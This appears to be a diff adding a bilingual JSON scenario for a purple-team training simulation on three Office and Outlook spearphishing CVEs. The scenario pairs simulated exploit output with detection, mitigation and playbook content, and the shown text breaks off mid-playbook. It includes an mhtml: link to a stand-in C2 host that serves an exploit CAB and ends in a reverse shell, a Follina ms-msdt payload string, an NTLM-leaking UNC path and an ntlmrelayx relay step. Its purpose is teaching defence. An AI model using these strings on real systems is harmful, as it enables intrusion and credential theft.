@@ -1,0 +1,246 @@
+{
+  "id": "T1566.001-expert",
+  "title": "Purple Team CVE 분석과 제로데이 대응",
+  "titleEn": "Purple Team CVE Analysis and Zero-Day Response",
+  "duration": 14,
+  "phases": [
+    { "label": "🟣 Purple Team 준비", "labelEn": "🟣 Purple Team Prep", "steps": [0] },
+    { "label": "🔴 CVE 재현", "labelEn": "🔴 CVE Reproduction", "steps": [1, 2, 3] },
+    { "label": "🔍 CTI 통합", "labelEn": "🔍 CTI Integration", "steps": [4] },
+    { "label": "📋 전략", "labelEn": "📋 Strategy", "steps": [5, 6] }
+  ],
+  "topoNodes": [
+    { "id": "red", "label": "Red Team", "x": 50, "y": 30 },
+    { "id": "blue", "label": "Blue Team", "x": 50, "y": 90 },
+    { "id": "emailgw", "label": "Email Gateway", "x": 200, "y": 30 },
+    { "id": "siem", "label": "SIEM", "x": 200, "y": 90 },
+    { "id": "edr", "label": "EDR", "x": 350, "y": 90 },
+    { "id": "pc", "label": "Victim PC", "x": 350, "y": 30 },
+    { "id": "c2", "label": "C2 Server", "x": 500, "y": 30 },
+    { "id": "tip", "label": "Threat Intel Platform", "x": 500, "y": 90 }
+  ],
+  "topoEdges": [
+    { "from": "red", "to": "emailgw", "minStep": 1 },
+    { "from": "emailgw", "to": "pc", "minStep": 1 },
+    { "from": "pc", "to": "c2", "minStep": 2 },
+    { "from": "edr", "to": "pc", "minStep": 2 },
+    { "from": "siem", "to": "edr", "minStep": 3 },
+    { "from": "tip", "to": "siem", "minStep": 4 },
+    { "from": "blue", "to": "siem", "minStep": 5 },
+    { "from": "blue", "to": "edr", "minStep": 6 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "Purple Team Dashboard", "icon": "🟣" },
+    { "name": "CVE Database", "icon": "🔴" },
+    { "name": "MITRE Navigator", "icon": "🗺️" },
+    { "name": "Playbook Editor", "icon": "📋" }
+  ],
+  "steps": [
+    {
+      "cmd": "python3 purple_team.py --phase kickoff --attack-plan T1566.001",
+      "out": "[+] Purple Team Exercise: T1566.001 Spearphishing Attachment\n═══════════════════════════════════════════════════════\n\n[KICKOFF] Initializing Purple Team framework...\n\nRed Team Objectives:\n  1. Reproduce 3 CVEs targeting email-borne document exploits\n  2. Validate detection coverage for MSHTML, MSDT, Outlook vectors\n  3. Test zero-day response procedures\n\nBlue Team Objectives:\n  1. Measure Mean Time to Detect (MTTD) per CVE\n  2. Validate SIEM correlation rules fire correctly\n  3. Document detection gaps and remediation plan\n\nScope:\n  - Attack Surface: {companyName} email infrastructure\n  - Target: {userName}@{companyName}.com (authorized test account)\n  - Duration: 4 hours (controlled environment)\n  - Rules of Engagement: No production impact, sandboxed execution\n\n[+] Attack matrix loaded: 3 CVEs × 7 detection points = 21 test cases\n[+] MITRE ATT&CK Navigator layer exported: purple_team_T1566.001.json\n[+] Kickoff complete. Red Team: proceed with CVE-2021-40444.",
+      "def": "[SOC] Purple Team exercise initiated - authorized penetration test for T1566.001 coverage validation",
+      "defAction": "Source: Purple Team coordination\nTarget: {companyName} email security stack\nAction: SOC notified, detection baselines captured, logging verbosity increased",
+      "desc": "Purple Team 연습을 시작합니다. Red Team 공격 시나리오를 설계하고 Blue Team 탐지 목표를 정의합니다.",
+      "descEn": "The Purple Team exercise begins. Red Team attack scenarios are designed and Blue Team detection objectives are defined.",
+      "stepTitle": "Purple Team 킥오프",
+      "stepTitleEn": "Purple Team Kickoff",
+      "feynman": "Purple Team은 Red Team(공격)과 Blue Team(방어)이 함께 훈련하는 것입니다. 소방 훈련에 비유하면, 한 팀이 실제로 불을 피우고(Red), 다른 팀이 얼마나 빨리 감지하고 진압하는지(Blue) 측정합니다. 서로 협력하여 '우리 방어 체계의 구멍'을 찾는 것이 목적입니다. 오늘은 스피어피싱 관련 CVE 3개를 재현하며 탐지력을 검증합니다.",
+      "feynmanEn": "Purple Team is Red Team (offense) and Blue Team (defense) training together. Like a fire drill where one team starts actual fires (Red) while the other measures how quickly they detect and extinguish them (Blue). The goal is collaboration to find gaps in defenses. Today, we reproduce 3 spearphishing CVEs to validate detection coverage.",
+      "expert": "Purple Team 연습은 MITRE ATT&CK 기반 커버리지 검증 프레임워크입니다. 3개 CVE(2021-40444, 2022-30190, 2023-23397)를 T1566.001 서브테크닉에 매핑하고, 각 CVE별 킬체인 단계에서 탐지 포인트를 정의합니다. 21개 테스트 케이스(3 CVE × 7 탐지 포인트)로 MTTD(Mean Time to Detect)를 정량화합니다.",
+      "expertEn": "Purple Team exercises are MITRE ATT&CK-based coverage validation frameworks. Three CVEs (2021-40444, 2022-30190, 2023-23397) are mapped to the T1566.001 sub-technique, with detection points defined at each kill chain stage. 21 test cases (3 CVEs × 7 detection points) quantify MTTD (Mean Time to Detect).",
+      "defTooltip": "🟣 SOC: Purple Team 연습이 시작되었습니다 - 인가된 침투 테스트입니다",
+      "defTooltipEn": "🟣 SOC: Purple Team exercise initiated - authorized penetration test",
+      "hackerLog": {
+        "title": "purple_team_kickoff.log",
+        "lines": [
+          { "log": "Attack matrix loaded: 3 CVEs × 7 detection points = 21 test cases", "desc": "💡 각 CVE별 7개 탐지 포인트를 검증하여 방어 커버리지를 정량화합니다" },
+          { "log": "Rules of Engagement: No production impact, sandboxed execution", "desc": "💡 프로덕션 환경에 영향 없이 샌드박스에서만 실행하는 안전 규칙입니다" },
+          { "log": "MITRE ATT&CK Navigator layer exported", "desc": "💡 ATT&CK Navigator로 공격/탐지 매핑을 시각화하여 갭을 식별합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Purple Team", "desc": "Red Team(공격)과 Blue Team(방어)이 협력하여 조직의 보안 태세를 평가하는 훈련 방식. 실제 공격을 재현하고 탐지·대응 능력을 검증합니다" },
+        { "name": "MTTD (Mean Time to Detect)", "desc": "위협이 발생한 시점부터 탐지까지 걸리는 평균 시간. Purple Team 연습의 핵심 성과 지표(KPI)입니다" }
+      ]
+    },
+    {
+      "cmd": "python3 cve_2021_40444.py --generate-payload --cab-server",
+      "out": "[+] CVE-2021-40444: MSHTML Remote Code Execution\n═══════════════════════════════════════════════════════\n\n[*] Vulnerability: Microsoft MSHTML engine in Office documents\n[*] CVSS: 8.8 (HIGH) | Exploited in wild: Yes (Sep 2021)\n[*] Attack vector: .docx with embedded OLE → mshtml:http// → .CAB download → .DLL execution\n\n[PAYLOAD GENERATION]\n1. Creating malicious .docx with OLE object...\n   └─ document.xml.rels → mhtml:http://c2.{companyName}-test.com/exploit.html\n2. Hosting exploit HTML on CAB server...\n   └─ exploit.html → <object classid=\"CLSID:...\" codebase=\"exploit.cab\">\n3. Packaging .CAB with payload DLL...\n   └─ exploit.cab → championship.inf (renamed .dll)\n4. Starting CAB delivery server on port 8080...\n   └─ http://c2.{companyName}-test.com:8080/exploit.cab\n\n[+] Exploit document ready: quarterly_report.docx\n[+] CAB server listening: 0.0.0.0:8080\n\n[EXECUTION CHAIN]\n  WINWORD.EXE → mshtml.dll (OLE) → HTTP GET /exploit.html\n  → .CAB download → control.exe → rundll32.exe championship.inf\n  → Reverse shell established\n\n[!] Red Team: Payload delivered. Blue Team: Start detection timer.",
+      "def": "[EDR] CVE-2021-40444 indicator: WINWORD.EXE spawned mshtml.dll loading remote OLE object via mhtml: protocol",
+      "defAction": "Source: CrowdStrike Falcon + Sysmon EventID 11,7\nTarget: DESKTOP-TEST01\nAction: Process tree killed, .CAB download blocked by proxy, IOC extracted for SIEM rule",
+      "desc": "CVE-2021-40444 MSHTML 취약점을 재현합니다. Office 문서의 OLE 객체가 원격 HTML을 로드하여 코드를 실행합니다.",
+      "descEn": "Reproducing CVE-2021-40444 MSHTML vulnerability. An OLE object in an Office document loads remote HTML to achieve code execution.",
+      "stepTitle": "CVE-2021-40444 MSHTML 익스플로잇 재현",
+      "stepTitleEn": "CVE-2021-40444 MSHTML Exploit Reproduction",
+      "feynman": "이 취약점은 Word 문서 안에 '외부 링크'를 숨겨놓는 것입니다. 문서를 열면 Word가 자동으로 인터넷에서 HTML 페이지를 불러오고, 그 HTML이 CAB 파일(압축 파일)을 다운로드하고, 그 안의 DLL이 실행됩니다. 마치 택배 상자(문서) 안에 리모컨(OLE)이 있고, 리모컨을 누르면 자동으로 폭발물(악성코드)이 배달되는 것과 같습니다.",
+      "feynmanEn": "This vulnerability hides an 'external link' inside a Word document. Opening it makes Word automatically fetch an HTML page from the internet, which downloads a CAB file (archive), and the DLL inside executes. Like a package (document) containing a remote control (OLE) that automatically orders explosives (malware) when pressed.",
+      "expert": "CVE-2021-40444는 MSHTML(Trident) 렌더링 엔진의 OLE 객체 처리 취약점입니다. document.xml.rels에 mhtml: 프로토콜 핸들러로 원격 HTML을 참조하면, mshtml.dll이 로드되어 ActiveX 컨트롤을 통해 .CAB 파일을 다운로드합니다. CAB 내 .inf 파일(실제 DLL)이 control.exe를 통해 실행됩니다. 패치: KB5005565 (2021-09-14).",
+      "expertEn": "CVE-2021-40444 exploits an OLE object handling vulnerability in the MSHTML (Trident) rendering engine. When document.xml.rels references remote HTML via the mhtml: protocol handler, mshtml.dll loads and downloads a .CAB file through ActiveX controls. The .inf file (actually a DLL) inside the CAB executes via control.exe. Patch: KB5005565 (2021-09-14).",
+      "defTooltip": "🔴 EDR: WINWORD.EXE에서 mshtml.dll이 원격 OLE 객체를 로드하는 CVE-2021-40444 지표가 감지되었습니다",
+      "defTooltipEn": "🔴 EDR: CVE-2021-40444 indicator - WINWORD.EXE spawned mshtml.dll loading remote OLE object",
+      "hackerLog": {
+        "title": "cve_2021_40444.log",
+        "lines": [
+          { "log": "document.xml.rels → mhtml:http://c2.{companyName}-test.com/exploit.html", "desc": "💡 OLE 관계 파일에 원격 URL을 삽입하여 문서 열기만으로 외부 코드를 로드합니다" },
+          { "log": "exploit.cab → championship.inf (renamed .dll)", "desc": "💡 DLL을 .inf 확장자로 위장하여 CAB 추출 시 자동 실행을 유도합니다" },
+          { "log": "WINWORD.EXE → mshtml.dll → HTTP GET → .CAB → control.exe → rundll32.exe", "desc": "💡 전체 익스플로잇 체인 — 매크로 없이 문서만 열어도 코드가 실행됩니다" }
+        ]
+      },
+      "terms": [
+        { "name": "CVE-2021-40444", "desc": "Microsoft MSHTML 원격 코드 실행 취약점(CVSS 8.8). Office 문서의 OLE 객체를 통해 매크로 없이도 악성 코드를 실행할 수 있어 2021년 실제 공격에 사용되었습니다" },
+        { "name": "OLE (Object Linking and Embedding)", "desc": "Microsoft의 문서 간 객체 공유 기술. 문서 안에 다른 애플리케이션의 객체를 삽입할 수 있으며, 이를 악용하면 외부 리소스를 자동 로드할 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "python3 follina_exploit.py --docx template.docx --command calc.exe",
+      "out": "[+] CVE-2022-30190: Follina MSDT Remote Code Execution\n═══════════════════════════════════════════════════════\n\n[*] Vulnerability: Microsoft Support Diagnostic Tool (MSDT) via ms-msdt: protocol\n[*] CVSS: 7.8 (HIGH) | Exploited in wild: Yes (May 2022)\n[*] Attack vector: .docx → OLE → ms-msdt:// URI → PowerShell execution\n\n[PAYLOAD GENERATION]\n1. Injecting ms-msdt handler into document.xml.rels...\n   └─ Target: ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?...\"\n2. Encoding PowerShell payload in MSDT parameters...\n   └─ Command: calc.exe (PoC - replaceable with any payload)\n   └─ Encoded: /param \"IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed\n      IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]\n      ::UTF8.GetString([System.Convert]::FromBase64String(\"Y2FsYy5leGU=\"))'))))\"\n3. Document created: follina_poc.docx\n\n[EXECUTION CHAIN]\n  WINWORD.EXE → OLE Link → ms-msdt:/id PCWDiagnostic\n  → msdt.exe → sdiagnhost.exe → PowerShell\n  → calc.exe (PoC payload)\n\n[!] Note: Preview pane in Explorer also triggers this - no click required!\n[!] Red Team: Document delivered. Blue Team: Monitor msdt.exe spawning.",
+      "def": "[SIEM] CVE-2022-30190 Follina indicator: msdt.exe spawned by WINWORD.EXE with suspicious IT_BrowseForFile parameter",
+      "defAction": "Source: Sysmon EventID 1 + SIEM correlation rule\nTarget: msdt.exe process (PID: 7721)\nAction: MSDT protocol handler disabled via registry, ms-msdt: URI scheme blocked",
+      "desc": "CVE-2022-30190 Follina 취약점을 재현합니다. MSDT 프로토콜 핸들러를 악용하여 매크로 없이 코드를 실행합니다.",
+      "descEn": "Reproducing CVE-2022-30190 Follina vulnerability. The MSDT protocol handler is abused to execute code without macros.",
+      "stepTitle": "CVE-2022-30190 Follina MSDT 악용 재현",
+      "stepTitleEn": "CVE-2022-30190 Follina MSDT Exploitation",
+      "feynman": "Follina는 Windows의 '문제 해결 도구(MSDT)'를 악용합니다. Word 문서에 특수한 링크(ms-msdt://)를 넣으면, Windows가 자동으로 진단 도구를 실행하는데, 이 진단 도구의 매개변수에 PowerShell 명령을 몰래 넣을 수 있습니다. 가장 무서운 점은 파일을 열지 않아도 탐색기 미리보기만으로 실행된다는 것입니다.",
+      "feynmanEn": "Follina abuses Windows' troubleshooting tool (MSDT). Embedding a special link (ms-msdt://) in a Word document makes Windows automatically launch the diagnostic tool, whose parameters can secretly contain PowerShell commands. The scariest part: even the Explorer preview pane triggers it without opening the file.",
+      "expert": "CVE-2022-30190은 ms-msdt: URI 프로토콜 핸들러 취약점입니다. OLE 링크가 ms-msdt:/id PCWDiagnostic을 호출하면 msdt.exe가 실행되고, IT_BrowseForFile 파라미터에 삽입된 PowerShell이 sdiagnhost.exe 컨텍스트에서 실행됩니다. Protected View를 우회하며, RTF 형식에서는 미리보기만으로 트리거됩니다. 완화: HKCR\\ms-msdt 레지스트리 키 삭제.",
+      "expertEn": "CVE-2022-30190 is an ms-msdt: URI protocol handler vulnerability. When an OLE link invokes ms-msdt:/id PCWDiagnostic, msdt.exe launches and PowerShell injected in the IT_BrowseForFile parameter executes under sdiagnhost.exe context. It bypasses Protected View, and in RTF format, the preview pane alone triggers it. Mitigation: delete HKCR\\ms-msdt registry key.",
+      "defTooltip": "🔴 SIEM: WINWORD.EXE에서 의심스러운 파라미터로 msdt.exe가 실행된 Follina 지표 감지",
+      "defTooltipEn": "🔴 SIEM: Follina indicator - msdt.exe spawned by WINWORD.EXE with suspicious parameters",
+      "hackerLog": {
+        "title": "follina_exploit.log",
+        "lines": [
+          { "log": "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?...\"", "desc": "💡 MSDT 진단 도구를 강제 실행하고 PowerShell 명령을 매개변수에 주입합니다" },
+          { "log": "Preview pane in Explorer also triggers this - no click required!", "desc": "💡 RTF 형식에서는 파일을 열지 않고 미리보기만으로 코드가 실행됩니다" },
+          { "log": "msdt.exe → sdiagnhost.exe → PowerShell → calc.exe", "desc": "💡 프로세스 체인이 일반적인 매크로 공격과 완전히 달라 기존 탐지 규칙을 우회합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "CVE-2022-30190 (Follina)", "desc": "Microsoft MSDT 원격 코드 실행 취약점(CVSS 7.8). Office 문서의 URL 프로토콜을 통해 진단 도구(msdt.exe)를 악용하여 코드를 실행합니다. 미리보기만으로 트리거 가능합니다" },
+        { "name": "MSDT (Microsoft Support Diagnostic Tool)", "desc": "Windows 내장 문제 해결 도구. ms-msdt: 프로토콜 핸들러를 통해 호출되며, Follina 취약점 이후 Microsoft가 프로토콜 자체를 비활성화했습니다" }
+      ]
+    },
+    {
+      "cmd": "python3 cve_2023_23397.py --analyze appointment.msg --extract-unc",
+      "out": "[+] CVE-2023-23397: Outlook NTLM Relay / Credential Theft\n═══════════════════════════════════════════════════════\n\n[*] Vulnerability: Outlook calendar reminder triggers NTLM auth to attacker UNC path\n[*] CVSS: 9.8 (CRITICAL) | Exploited in wild: Yes (Mar 2023, APT28/Fancy Bear)\n[*] Attack vector: .msg with PidLidReminderFileParameter → \\\\attacker\\share\n\n[ANALYSIS] Examining appointment.msg...\n1. MAPI Property Extraction:\n   └─ PidLidReminderOverride: true\n   └─ PidLidReminderFileParameter: \\\\185.220.101.34\\share\\meeting.wav\n   └─ PidLidReminderPlaySound: true\n   └─ Subject: \"Q4 Budget Review - URGENT\"\n   └─ Start: 2024-01-15T09:00:00 (past date → immediate reminder trigger)\n\n2. UNC Path Analysis:\n   └─ Target: \\\\185.220.101.34\\share\\meeting.wav\n   └─ Protocol: SMB (TCP 445)\n   └─ Effect: Outlook auto-connects → NTLM hash sent to attacker\n   └─ No user interaction required (calendar reminder auto-triggers)\n\n3. NTLM Relay Attack Flow:\n   └─ Victim Outlook → SMB → Attacker Responder → Capture NTLMv2 hash\n   └─ ntlmrelayx.py → Relay to Exchange/AD → Authenticated access\n\n[+] Extracted IOC: \\\\185.220.101.34\\share\\\n[!] CRITICAL: This CVE requires ZERO user interaction. Receiving the email is enough.\n[!] Red Team: Hash captured. Blue Team: Check outbound SMB (445) to external IPs.",
+      "def": "[Firewall] Outbound SMB connection to external IP 185.220.101.34:445 blocked — CVE-2023-23397 NTLM leak attempt",
+      "defAction": "Source: Next-Gen Firewall + Sysmon EventID 3\nTarget: Outbound SMB to 185.220.101.34\nAction: Egress SMB to external blocked, Outlook patched (KB5023190), PidLidReminderFileParameter audit",
+      "desc": "CVE-2023-23397 Outlook NTLM 릴레이 취약점을 분석합니다. 캘린더 알림이 공격자의 UNC 경로로 NTLM 해시를 자동 전송합니다.",
+      "descEn": "Analyzing CVE-2023-23397 Outlook NTLM relay vulnerability. A calendar reminder automatically sends the NTLM hash to the attacker's UNC path.",
+      "stepTitle": "CVE-2023-23397 Outlook NTLM 릴레이 분석",
+      "stepTitleEn": "CVE-2023-23397 Outlook NTLM Relay Analysis",
+      "feynman": "이 취약점은 가장 위험한 종류입니다 — 사용자가 아무것도 클릭하지 않아도 됩니다. Outlook 캘린더 초대에 '알림 소리 파일' 경로를 공격자 서버(\\\\해커서버\\share)로 설정하면, 알림이 울릴 때 Windows가 자동으로 해커 서버에 접속하면서 비밀번호 해시를 보냅니다. 이메일을 받는 것만으로 해킹되는 것입니다.",
+      "feynmanEn": "This vulnerability is the most dangerous kind — the user doesn't need to click anything. By setting the 'reminder sound file' path in an Outlook calendar invite to an attacker server (\\\\hacker\\share), Windows automatically connects to the hacker's server when the reminder fires, sending the password hash. Simply receiving the email is enough to be compromised.",
+      "expert": "CVE-2023-23397(CVSS 9.8)은 Outlook의 MAPI 속성 PidLidReminderFileParameter가 UNC 경로를 검증 없이 처리하는 취약점입니다. 과거 날짜의 캘린더 항목은 수신 즉시 알림을 트리거하고, Windows가 SMB 인증을 시도하며 NTLMv2 해시를 전송합니다. APT28(Fancy Bear)이 우크라이나, 유럽 기관을 대상으로 실전 사용했으며, ntlmrelayx로 Exchange/AD에 릴레이하면 도메인 접근이 가능합니다.",
+      "expertEn": "CVE-2023-23397 (CVSS 9.8) exploits Outlook's MAPI property PidLidReminderFileParameter processing UNC paths without validation. Past-date calendar items trigger reminders immediately upon receipt, causing Windows to attempt SMB authentication and leak NTLMv2 hashes. APT28 (Fancy Bear) used it against Ukrainian and European organizations. Relaying via ntlmrelayx to Exchange/AD grants domain access.",
+      "defTooltip": "🔥 방화벽: 외부 IP 185.220.101.34:445로의 아웃바운드 SMB 연결 차단 — NTLM 유출 시도",
+      "defTooltipEn": "🔥 Firewall: Outbound SMB to external IP 185.220.101.34:445 blocked — NTLM leak attempt",
+      "hackerLog": {
+        "title": "cve_2023_23397_analysis.log",
+        "lines": [
+          { "log": "PidLidReminderFileParameter: \\\\185.220.101.34\\share\\meeting.wav", "desc": "💡 알림 소리 파일 경로가 외부 IP로 설정되어 NTLM 해시가 자동 전송됩니다" },
+          { "log": "No user interaction required (calendar reminder auto-triggers)", "desc": "💡 제로클릭 취약점 — 이메일 수신만으로 NTLM 해시가 유출됩니다" },
+          { "log": "ntlmrelayx.py → Relay to Exchange/AD → Authenticated access", "desc": "💡 탈취한 NTLM 해시를 AD에 릴레이하면 도메인 전체 접근이 가능합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "CVE-2023-23397", "desc": "Outlook NTLM 자격증명 유출 취약점(CVSS 9.8). 캘린더 알림의 UNC 경로를 악용하여 사용자 상호작용 없이 NTLM 해시를 탈취합니다. APT28이 실전에서 사용했습니다" },
+        { "name": "NTLM Relay", "desc": "탈취한 NTLM 인증 요청을 다른 서비스로 전달(릴레이)하여 인증을 우회하는 공격. 해시 자체를 크래킹하지 않고도 인증된 접근을 획득합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 cti_integrator.py --source mitre-attack --technique T1566.001 --correlate",
+      "out": "[+] CTI Integration: T1566.001 Spearphishing Attachment\n═══════════════════════════════════════════════════════\n\n[*] Querying MITRE ATT&CK STIX database...\n[*] Correlating with CISA KEV, NVD, and internal threat feeds...\n\nThreat Actor Mapping:\n  ┌─────────────────┬──────────────────┬─────────────────────────┐\n  │ APT Group       │ CVEs Used        │ Target Sectors          │\n  ├─────────────────┼──────────────────┼─────────────────────────┤\n  │ APT28 (Russia)  │ CVE-2023-23397  │ Government, Defense     │\n  │ APT29 (Russia)  │ CVE-2021-40444  │ Tech, Healthcare        │\n  │ TA570 (Qakbot)  │ CVE-2022-30190  │ Finance, Manufacturing  │\n  │ Lazarus (DPRK)  │ CVE-2021-40444  │ Crypto, Defense         │\n  └─────────────────┴──────────────────┴─────────────────────────┘\n\nDetection Gap Analysis (from Purple Team results):\n  CVE-2021-40444: ✅ EDR detected (MTTD: 12s) | ⚠️ Email GW missed .docx variant\n  CVE-2022-30190: ✅ SIEM correlated (MTTD: 45s) | ⚠️ RTF preview pane not covered\n  CVE-2023-23397: ✅ Firewall blocked SMB (MTTD: 3s) | ⚠️ Internal relay path unmonitored\n\nIOC Export (STIX 2.1):\n  [+] 14 indicators exported to threat_intel_platform\n  [+] 8 YARA rules generated from CVE payloads\n  [+] 3 Sigma rules created for SIEM correlation\n  [+] MITRE Navigator layer updated: 67% detection coverage → gaps highlighted\n\n[!] Critical Gap: RTF preview pane exploitation (Follina) has no detection rule.\n[!] Recommendation: Deploy ASR rule to block ms-msdt: protocol handler.",
+      "def": "[Threat Intel Platform] CTI correlation complete: 3 detection gaps identified across email security stack",
+      "defAction": "Source: MITRE ATT&CK + CISA KEV + Internal feeds\nTarget: Detection rule coverage for T1566.001\nAction: 8 YARA + 3 Sigma rules deployed, Navigator layer shared with SOC",
+      "desc": "MITRE ATT&CK 기반으로 위협 인텔리전스를 통합하고, Purple Team 결과에서 탐지 갭을 식별합니다.",
+      "descEn": "Integrating threat intelligence based on MITRE ATT&CK and identifying detection gaps from Purple Team results.",
+      "stepTitle": "CTI 기반 위협 인텔리전스 통합",
+      "stepTitleEn": "CTI-Based Threat Intelligence Integration",
+      "feynman": "지금까지 3개 CVE를 테스트했으니, 이제 '성적표'를 만드는 단계입니다. 어떤 공격을 잡았고(MTTD 12초, 45초, 3초), 어떤 것을 놓쳤는지(이메일 게이트웨이의 .docx 변종, RTF 미리보기, 내부 릴레이) 정리합니다. 실제로 이 CVE들을 사용하는 APT 그룹(APT28, Lazarus 등)도 매핑하여 '우리가 어떤 적에게 취약한지' 파악합니다.",
+      "feynmanEn": "After testing 3 CVEs, it's time to create the 'report card.' We document what was caught (MTTD 12s, 45s, 3s) and what was missed (email gateway .docx variant, RTF preview, internal relay). We also map APT groups (APT28, Lazarus) that use these CVEs to understand 'which adversaries we're vulnerable to.'",
+      "expert": "CTI 통합은 STIX 2.1 기반으로 MITRE ATT&CK, CISA KEV(Known Exploited Vulnerabilities), NVD를 상관분석합니다. Purple Team 결과의 MTTD를 정량화하고, 탐지 커버리지 갭을 ATT&CK Navigator 레이어로 시각화합니다. IOC를 YARA(파일 기반), Sigma(로그 기반) 규칙으로 자동 변환하여 방어 체계에 배포합니다.",
+      "expertEn": "CTI integration correlates MITRE ATT&CK, CISA KEV (Known Exploited Vulnerabilities), and NVD using STIX 2.1. Purple Team MTTD results are quantified and detection coverage gaps visualized as ATT&CK Navigator layers. IOCs are automatically converted to YARA (file-based) and Sigma (log-based) rules for deployment to defensive infrastructure.",
+      "defTooltip": "🔍 위협 인텔 플랫폼: CTI 상관분석 완료 — 이메일 보안 스택에서 3개 탐지 갭 식별",
+      "defTooltipEn": "🔍 Threat Intel Platform: CTI correlation complete — 3 detection gaps identified in email security stack",
+      "hackerLog": {
+        "title": "cti_correlation.log",
+        "lines": [
+          { "log": "CVE-2022-30190: ⚠️ RTF preview pane not covered", "desc": "💡 Follina의 RTF 미리보기 트리거에 대한 탐지 규칙이 없는 치명적 갭입니다" },
+          { "log": "14 indicators exported to threat_intel_platform", "desc": "💡 STIX 2.1 형식으로 IOC를 내보내 조직 전체 방어 체계에 공유합니다" },
+          { "log": "67% detection coverage → gaps highlighted", "desc": "💡 ATT&CK Navigator로 시각화하면 어디가 빈틈인지 한눈에 보입니다" }
+        ]
+      },
+      "terms": [
+        { "name": "STIX 2.1 (Structured Threat Information eXpression)", "desc": "위협 인텔리전스를 교환하기 위한 표준 데이터 형식. IOC, 공격 패턴, 위협 행위자 정보를 구조화된 JSON으로 표현합니다" },
+        { "name": "Sigma Rule", "desc": "SIEM 시스템에 독립적인 로그 탐지 규칙 형식. 한 번 작성하면 Splunk, Elastic, QRadar 등 다양한 SIEM에서 사용할 수 있습니다" }
+      ]
+    },
+    {
+      "cmd": "python3 playbook_builder.py --scenario zero-day-spearphish --output playbook.json",
+      "out": "[+] Zero-Day Spearphishing Response Playbook Builder\n═══════════════════════════════════════════════════════\n\n[*] Building playbook from Purple Team findings + CTI data...\n\nPlaybook: ZERO-DAY-SPEARPHISH-RESPONSE v1.0\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nPhase 1: DETECTION (0-15 min)\n  ├─ Trigger: Unknown file format anomaly in email attachment\n  ├─ Action: Email gateway → sandbox detonation (5 min timeout)\n  ├─ Action: EDR telemetry check for unusual process chains\n  ├─ Escalation: If sandbox inconclusive → Tier 2 analyst manual review\n  └─ ASR Rules: Block Office child processes, disable ms-msdt: handler\n\nPhase 2: CONTAINMENT (15-60 min)\n  ├─ Action: Quarantine affected mailboxes (Exchange PowerShell)\n  ├─ Action: Block sender domain + C2 IPs at firewall\n  ├─ Action: Isolate affected endpoints via EDR network containment\n  ├─ Action: Disable external SMB (port 445) at perimeter\n  └─ Communication: CISO briefing template auto-generated\n\nPhase 3: ERADICATION (1-4 hours)\n  ├─ Action: Memory forensics on affected endpoints (Volatility)\n  ├─ Action: Registry/Startup persistence check (Autoruns)\n  ├─ Action: Network IOC sweep (Zeek logs + NetFlow)\n  └─ Action: Deploy emergency YARA rules to all endpoints\n\nPhase 4: RECOVERY (4-24 hours)\n  ├─ Action: Reimage affected endpoints from golden image\n  ├─ Action: Force credential rotation for affected users\n  ├─ Action: Validate clean state with EDR full scan\n  └─ Action: Monitor for re-infection indicators (30 days)\n\n[+] Playbook exported: playbook.json (SOAR-compatible format)\n[+] Runbook automations: 12 actions marked for SOAR integration\n[+] Estimated response time: 4-6 hours (vs current 12+ hours)",
+      "def": "[SOAR] Zero-day spearphishing playbook v1.0 deployed — 12 automated response actions configured",
+      "defAction": "Source: Playbook builder + Purple Team lessons learned\nTarget: SOC incident response workflow\nAction: SOAR playbook activated, response time target reduced from 12h to 4-6h",
+      "desc": "Purple Team 결과와 CTI 데이터를 기반으로 제로데이 스피어피싱 대응 플레이북을 작성합니다.",
+      "descEn": "Building a zero-day spearphishing response playbook based on Purple Team results and CTI data.",
+      "stepTitle": "제로데이 대응 플레이북 작성",
+      "stepTitleEn": "Zero-Day Response Playbook Creation",
+      "feynman": "플레이북은 소방서의 '화재 대응 매뉴얼'과 같습니다. 제로데이(아직 패치가 없는 취약점)가 스피어피싱으로 들어왔을 때, 누가 무엇을 언제 해야 하는지 4단계로 정리합니다: 감지(15분 이내), 차단(1시간 이내), 제거(4시간 이내), 복구(24시간 이내). 이전에 Purple Team에서 발견한 탐지 갭을 메우는 조치도 포함합니다.",
+      "feynmanEn": "A playbook is like a fire department's 'fire response manual.' When a zero-day (unpatched vulnerability) arrives via spearphishing, it defines who does what and when in 4 phases: Detection (15 min), Containment (1 hour), Eradication (4 hours), Recovery (24 hours). It also includes measures to close detection gaps found during the Purple Team exercise.",
+      "expert": "NIST IR 프레임워크(SP 800-61r2) 기반 4단계 플레이북을 SOAR 호환 형식으로 생성합니다. Phase 1에서 ASR(Attack Surface Reduction) 규칙으로 Office 자식 프로세스와 ms-msdt: 핸들러를 차단하고, Phase 2에서 Exchange PowerShell로 메일박스를 격리합니다. 12개 자동화 액션은 SOAR(Security Orchestration, Automation and Response) 플랫폼에서 자동 실행 가능합니다.",
+      "expertEn": "A 4-phase playbook based on the NIST IR framework (SP 800-61r2) is generated in SOAR-compatible format. Phase 1 blocks Office child processes and ms-msdt: handlers via ASR rules. Phase 2 quarantines mailboxes via Exchange PowerShell. 12 automated actions are executable on SOAR platforms.",
+      "defTooltip": "📋 SOAR: 제로데이 스피어피싱 플레이북 v1.0 배포 — 12개 자동 대응 액션 구성 완료",
+      "defTooltipEn": "📋 SOAR: Zero-day spearphishing playbook v1.0 deployed — 12 automated response actions configured",
+      "hackerLog": {
+        "title": "playbook_builder.log",
+        "lines": [
+          { "log": "ASR Rules: Block Office child processes, disable ms-msdt: handler", "desc": "💡 Follina 갭을 메우기 위해 ms-msdt: 프로토콜 핸들러를 즉시 비활성화합니다" },
+          { "log": "12 actions marked for SOAR integration", "desc": "💡 수동 대응 12개 액션을 SOAR 플랫폼에서 자동화하여 대응 시간을 단축합니다" },
